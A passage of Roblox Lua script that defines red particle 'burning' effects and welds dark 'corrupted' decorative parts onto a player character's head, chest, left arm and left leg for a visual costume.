			eff2.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(.9,0),NumberSequenceKeypoint.new(1,1)})
			eff2.LightEmission = 1
			eff2.Lifetime = NumberRange.new(1)
			eff2.Speed = NumberRange.new(1)
			eff2.Rate = 100
			eff2.VelocitySpread = 10000
			eff2.Texture = "rbxassetid://347504259"
			eff2.Color = ColorSequence.new(Color3.new(1,0,0))
		end
	
		function BurningEff(part)
			local eff1 = Instance.new("ParticleEmitter",part)
			eff1.Size = NumberSequence.new(.1)
			eff1.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(.2,0),NumberSequenceKeypoint.new(1,1)})
			eff1.LightEmission = 1
			eff1.Lifetime = NumberRange.new(1)
			eff1.Speed = NumberRange.new(0)
			eff1.Rate = 100
			eff1.Texture = "rbxassetid://347504241"
			eff1.Acceleration = Vector3.new(0,10,0)
			eff1.Color = ColorSequence.new(Color3.new(1,0,0))
			local eff2 = Instance.new("ParticleEmitter",part)
			eff2.Size = NumberSequence.new(.1)
			eff2.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(.2,0),NumberSequenceKeypoint.new(1,1)})
			eff2.LightEmission = 1
			eff2.Lifetime = NumberRange.new(1)
			eff2.Speed = NumberRange.new(0)
			eff2.Rate = 100
			eff2.Texture = "rbxassetid://347504259"
			eff2.Acceleration = Vector3.new(0,10,0)
			eff2.Color = ColorSequence.new(Color3.new(1,0,0))
			local eff3 = Instance.new("ParticleEmitter",part)
			eff3.Size = NumberSequence.new(1)
			eff3.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)})
			eff3.LightEmission = 1
			eff3.Lifetime = NumberRange.new(1)
			eff3.Speed = NumberRange.new(0)
			eff3.Rate = 100
			eff3.Texture = "rbxasset://textures/particles/fire_main.dds"
			eff3.Acceleration = Vector3.new(0,10,0)
			eff3.Color = ColorSequence.new(Color3.new(1,0,0))
		end
	
		FakeHead = New("Model",chara,"FakeHead",{})
		MainPart = New("Part",FakeHead,"MainPart",{FormFactor = Enum.FormFactor.Symmetric,Size = Vector3.new(2, 1, 1),CFrame = CFrame.new(2.29537678, 7.81603718, 0.746068954, 0.00980896503, 0.00110200304, 0.999957919, -0.000536994543, 1.00000548, -0.00109680078, -0.99994874, -0.0005262224, 0.00980964955),CanCollide = false,TopSurface = Enum.SurfaceType.Smooth,})
		Mesh = New("SpecialMesh",MainPart,"Mesh",{Scale = Vector3.new(1.25, 1.25, 1.25),})
		face = New("Decal",MainPart,"face",{Texture = "rbxasset://textures/face.png",})
		Weld = New("ManualWeld",MainPart,"Weld",{Part0 = MainPart,Part1 = chara.Head,C0 = CFrame.new(0, 0, 0, 0.00980896503, -0.000536994543, -0.99994874, 0.00110200304, 1.00000548, -0.0005262224, 0.999957919, -0.00109680078, 0.00980964955),C1 = CFrame.new(5.96046448e-008, -8.58306885e-006, 0, 0.00980896503, -0.000536994543, -0.99994874, 0.00110200304, 1.00000548, -0.0005262224, 0.999957919, -0.00109680078, 0.00980964955),})
		FakeHead.MainPart.BrickColor = BrickColor.new("Cool yellow")
		EyeFire = New("Part",FakeHead,"EyeFire",{BrickColor = BrickColor.new("Really red"),Material = Enum.Material.Neon,Size = Vector3.new(0.400000006, 0.200000003, 0.200000003),CFrame = CFrame.new(1.69668579, 8.11665249, 0.640022159, -0.00107900088, 0.999958038, -0.00980941113, -1.0000056, -0.00107390946, 0.000525554642, 0.000515007298, 0.00981007144, 0.999948859),CanCollide = false,Color = Color3.new(1, 0, 0),})
		Mesh = New("CylinderMesh",EyeFire,"Mesh",{Offset = Vector3.new(0.0500000007, 0, -0.0399999991),Scale = Vector3.new(1, 0.150000006, 1),})
		Weld = New("ManualWeld",EyeFire,"Weld",{Part0 = EyeFire,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.0010790003, -0.999999344, 0.000515000196, 0.999951363, -0.0010738963, 0.00981000345, -0.00980944186, 0.000525560055, 0.99995178),C1 = CFrame.new(0.100008011, 0.300009251, -0.600027919, 0.00980899762, -0.000536999898, -0.99995178, 0.00110200245, 0.999999344, -0.000526215415, 0.999951363, -0.00109678751, 0.00980958249),})
		Chest = New("Model",chara,"Chest",{})
		MainPart = New("Part",Chest,"MainPart",{Transparency = 1,Transparency = 1,FormFactor = Enum.FormFactor.Symmetric,Size = Vector3.new(2, 2, 1),CFrame = CFrame.new(2.2937007, 6.31611967, 0.746871948, 0.00980956201, 0.00110224239, 0.999954581, -0.000537135813, 1.00000238, -0.00109703222, -0.99995023, -0.000526354474, 0.00981019717),CanCollide = false,LeftSurface = Enum.SurfaceType.Weld,RightSurface = Enum.SurfaceType.Weld,})
		Weld = New("ManualWeld",MainPart,"Weld",{Part0 = MainPart,Part1 = chara.Torso,C0 = CFrame.new(0, 0, 0, 0.009809535, -0.000537137908, -0.99994725, 0.00110225554, 1.00000858, -0.000526368851, 0.999961257, -0.00109705783, 0.00981026888),C1 = CFrame.new(5.96046448e-008, -9.05990601e-006, -2.38418579e-007, 0.00980956666, -0.000537143264, -0.99995023, 0.00110225484, 1.00000238, -0.000526361808, 0.999954581, -0.00109704456, 0.00981020182),})
		CorruptedPart = New("Part",Chest,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.400000006, 0.800000072, 1),CFrame = CFrame.new(2.28977966, 7.11656427, 1.34486222, -0.00110228383, -0.00980954897, -0.9999578, -1.00000536, 0.000536905834, 0.00109708123, 0.000526248943, 0.99994868, -0.00981033035),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.0011022957, -0.999999225, 0.000526249292, -0.00980958622, 0.000536918582, 0.99995172, -0.999951243, 0.0010970803, -0.00981026702),C1 = CFrame.new(-0.598430753, 0.800122261, 0.00106739998, 0.00980956666, -0.000537143264, -0.99995023, 0.00110225484, 1.00000238, -0.000526361808, 0.999954581, -0.00109704456, 0.00981020182),})
		CorruptedPart = New("Part",Chest,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.400000006, 0.400000066, 1),CFrame = CFrame.new(2.29174757, 6.71645212, 1.54485857, -0.00110228383, -0.00980954897, -0.9999578, -1.00000536, 0.000536905834, 0.00109708123, 0.000526248943, 0.99994868, -0.00981033035),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.0011022957, -0.999999225, 0.000526249292, -0.00980958622, 0.000536918582, 0.99995172, -0.999951243, 0.0010970803, -0.00981026702),C1 = CFrame.new(-0.798183441, 0.399908543, 0.00543618202, 0.00980956666, -0.000537143264, -0.99995023, 0.00110225484, 1.00000238, -0.000526361808, 0.999954581, -0.00109704456, 0.00981020182),})
		LeftArm = New("Model",chara,"LeftArm",{})
		MainPart = New("Part",LeftArm,"MainPart",{Transparency = 1,Transparency = 1,FormFactor = Enum.FormFactor.Symmetric,Size = Vector3.new(1, 2, 1),CFrame = CFrame.new(1.90889204, 6.31596565, 3.24640989, -0.0484240092, -0.0324009918, 0.998301268, -0.00117100019, 0.999474883, 0.0323822871, -0.998826265, 0.000399069104, -0.0484365262),CanCollide = false,})
		Weld = New("ManualWeld",MainPart,"Weld",{Part0 = MainPart,Part1 = chara["Left Arm"],C0 = CFrame.new(0, 0, 0, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),C1 = CFrame.new(0, -8.10623169e-006, -2.38418579e-007, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),})
		CorruptedPart = New("Part",LeftArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.400000006, 0.200000003),CFrame = CFrame.new(1.48370504, 6.50245714, 2.8663168, -0.048417028, -0.0324150361, 0.998301387, -0.00116700074, 0.999474525, 0.03239654, -0.998826742, 0.000403525919, -0.0484294258),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.048417028, -0.00116700074, -0.998826623, -0.0324150361, 0.999474466, 0.000403525832, 0.998301208, 0.0323965363, -0.0484294109),C1 = CFrame.new(0.400017738, 0.200018406, -0.400015235, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),})
		CorruptedPart = New("Part",LeftArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.600000024, 0.200000003),CFrame = CFrame.new(1.51924801, 6.60332775, 3.66543078, -0.048417028, -0.0324150361, 0.998301387, -0.00116700074, 0.999474525, 0.03239654, -0.998826742, 0.000403525919, -0.0484294258),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.048417028, -0.00116700074, -0.998826623, -0.0324150361, 0.999474466, 0.000403525832, 0.998301208, 0.0323965363, -0.0484294109),C1 = CFrame.new(-0.399997473, 0.300003052, -0.399972558, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),})
		EffCorruptedPart = New("Part",LeftArm,"EffCorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 1, 1),CFrame = CFrame.new(1.92512023, 5.81624889, 3.24619365, -0.048417028, -0.0324150361, 0.998301387, -0.00116700074, 0.999474525, 0.03239654, -0.998826742, 0.000403525919, -0.0484294258),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",EffCorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",EffCorruptedPart,"Weld",{Part0 = EffCorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.048417028, -0.00116700074, -0.998826623, -0.0324150361, 0.999474466, 0.000403525832, 0.998301208, 0.0323965363, -0.0484294109),C1 = CFrame.new(1.52587891e-005, -0.49998045, 2.90870667e-005, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),})
		CorruptedPart = New("Part",LeftArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.800000072, 0.200000003),CFrame = CFrame.new(2.31463432, 6.72918367, 3.62673688, -0.048417028, -0.0324150361, 0.998301387, -0.00116700074, 0.999474525, 0.03239654, -0.998826742, 0.000403525919, -0.0484294258),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.048417028, -0.00116700074, -0.998826623, -0.0324150361, 0.999474466, 0.000403525832, 0.998301208, 0.0323965363, -0.0484294109),C1 = CFrame.new(-0.400012016, 0.400006294, 0.400012136, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),})
		CorruptedPart = New("Part",LeftArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.200000003, 0.200000003),CFrame = CFrame.new(1.50631011, 6.40297413, 3.26581192, -0.048417028, -0.0324150361, 0.998301387, -0.00116700074, 0.999474525, 0.03239654, -0.998826742, 0.000403525919, -0.0484294258),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.048417028, -0.00116700074, -0.998826623, -0.0324150361, 0.999474466, 0.000403525832, 0.998301208, 0.0323965363, -0.0484294109),C1 = CFrame.new(1.3589859e-005, 0.100014687, -0.400020242, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),})
		CorruptedPart = New("Part",LeftArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.400000036, 0.200000003),CFrame = CFrame.new(1.92179501, 6.51633835, 3.64602208, -0.048417028, -0.0324150361, 0.998301387, -0.00116700074, 0.999474525, 0.03239654, -0.998826742, 0.000403525919, -0.0484294258),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.048417028, -0.00116700074, -0.998826623, -0.0324150361, 0.999474466, 0.000403525832, 0.998301208, 0.0323965363, -0.0484294109),C1 = CFrame.new(-0.40000248, 0.200008869, 1.37090683e-005, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),})
		BurningEff(EffCorruptedPart)
		LeftLeg = New("Model",chara,"LeftLeg",{})
		MainPart = New("Part",LeftLeg,"MainPart",{Transparency = 1,Transparency = 1,FormFactor = Enum.FormFactor.Symmetric,Size = Vector3.new(1, 2, 1),CFrame = CFrame.new(2.2865479, 1.31659603, 1.24781799, 0.00980953407, 0.00110225566, 0.999961138, -0.000537137908, 1.00000858, -0.00109705783, -0.99994719, -0.000526368851, 0.00981026888),CanCollide = false,BottomSurface = Enum.SurfaceType.Smooth,})
		Weld = New("ManualWeld",MainPart,"Weld",{Part0 = MainPart,Part1 = chara["Left Leg"],C0 = CFrame.new(0, 0, 0, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),C1 = CFrame.new(0, -8.58306885e-006, -2.38418579e-007, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
		EffCorruptedPart = New("Part",LeftLeg,"EffCorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 0.200000048, 1),CFrame = CFrame.new(2.28007793, 0.400032878, 1.25993299, 1.00001979, -3.03611159e-007, -5.47617674e-007, 5.67175448e-007, 1.00001717, -5.60779881e-007, -1.86450779e-006, 9.50574758e-007, 0.99998951),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",EffCorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",EffCorruptedPart,"Weld",{Part0 = EffCorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 1, 5.86369708e-007, -2.15602267e-006, -2.8440752e-007, 0.999998569, 9.76819592e-007, -8.39119252e-007, -5.34477465e-007, 0.999998569),C1 = CFrame.new(-0.0116856098, -0.916567385, -0.00534534454, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
		CorruptedPart = New("Part",LeftLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.600000024, 0.200000003),CFrame = CFrame.new(1.88013697, 0.800038397, 0.859943509, 1.00001979, -3.03611159e-007, -5.47617674e-007, 5.67175448e-007, 1.00001717, -5.60779881e-007, -1.86450779e-006, 9.50574758e-007, 0.99998951),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 1, 5.86369708e-007, -2.15602267e-006, -2.8440752e-007, 0.999998569, 9.76819592e-007, -8.39119252e-007, -5.34477465e-007, 0.999998569),C1 = CFrame.new(0.3841483, -0.516796231, -0.40962553, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
		CorruptedPart = New("Part",LeftLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.800000012, 0.200000003),CFrame = CFrame.new(2.69002914, 0.915953577, 0.851962805, 0.999971032, 0.0011022269, -0.00980960391, -0.00109704852, 1.00001776, 0.000537177373, 0.00981036108, -0.000526409131, 0.999942601),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999951303, -0.0010970087, 0.00981015898, 0.00110222446, 0.999999166, -0.000526388001, -0.00980970077, 0.00053719338, 0.99995172),C1 = CFrame.new(0.400011122, -0.399985313, 0.400013685, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
		CorruptedPart = New("Part",LeftLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.800000012, 0.200000003),CFrame = CFrame.new(1.88013721, 0.900040269, 1.65993917, 1.00001979, -3.03611159e-007, -5.47617674e-007, 5.67175448e-007, 1.00001717, -5.60779881e-007, -1.86450779e-006, 9.50574758e-007, 0.99998951),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 1, 5.86369708e-007, -2.15602267e-006, -2.8440752e-007, 0.999998569, 9.76819592e-007, -8.39119252e-007, -5.34477465e-007, 0.999998569),C1 = CFrame.new(-0.415866137, -0.41721642, -0.40188694, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
		CorruptedPart = New("Part",LeftLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.200000003, 0.200000003),CFrame = CFrame.new(1.88013721, 0.600035727, 1.25993288, 1.00001979, -3.03611159e-007, -5.47617674e-007, 5.67175448e-007, 1.00001717, -5.60779881e-007, -1.86450779e-006, 9.50574758e-007, 0.99998951),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 1, 5.86369708e-007, -2.15602267e-006, -2.8440752e-007, 0.999998569, 9.76819592e-007, -8.39119252e-007, -5.34477465e-007, 0.999998569),C1 = CFrame.new(-0.0157161951, -0.717007458, -0.405481935, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
		CorruptedPart = New("Part",LeftLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.400000006, 0.200000003),CFrame = CFrame.new(2.28007793, 0.700037479, 1.65993929, 1.00001967, -3.84054147e-007, 3.90969217e-006, 6.35045581e-007, 1.00001717, -5.60838998e-007, -6.19795173e-006, 9.32147486e-007, 0.99998951),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 1, 6.5424797e-007, -6.48946025e-006, -3.64865258e-007, 0.999998629, 9.58411874e-007, 3.61912225e-006, -5.34497644e-007, 0.999998629),C1 = CFrame.new(-0.411835551, -0.616776347, -0.00175023079, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
		CorruptedPart = New("Part",LeftLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 1.20000005, 0.200000003),CFrame = CFrame.new(2.68018699, 1.10004401, 1.65993941, 1.00001967, -3.84054147e-007, 3.90969217e-006, 6.35045581e-007, 1.00001717, -5.60838998e-007, -6.19795173e-006, 9.32147486e-007, 0.99998951),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 1, 6.5424797e-007, -6.48946025e-006, -3.64865258e-007, 0.999998629, 9.58411874e-007, 3.61912225e-006, -5.34497644e-007, 0.999998629),C1 = CFrame.new(-0.408125639, -0.216332912, 0.397896528, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
		CorruptedPart = New("Part",LeftLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.600000024, 0.200000003),CFrame = CFrame.new(2.68596959, 0.816166699, 1.25195313, 0.999971032, 0.0011022269, -0.00980960391, -0.00109704852, 1.00001776, 0.000537177373, 0.00981036108, -0.000526409131, 0.999942601),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
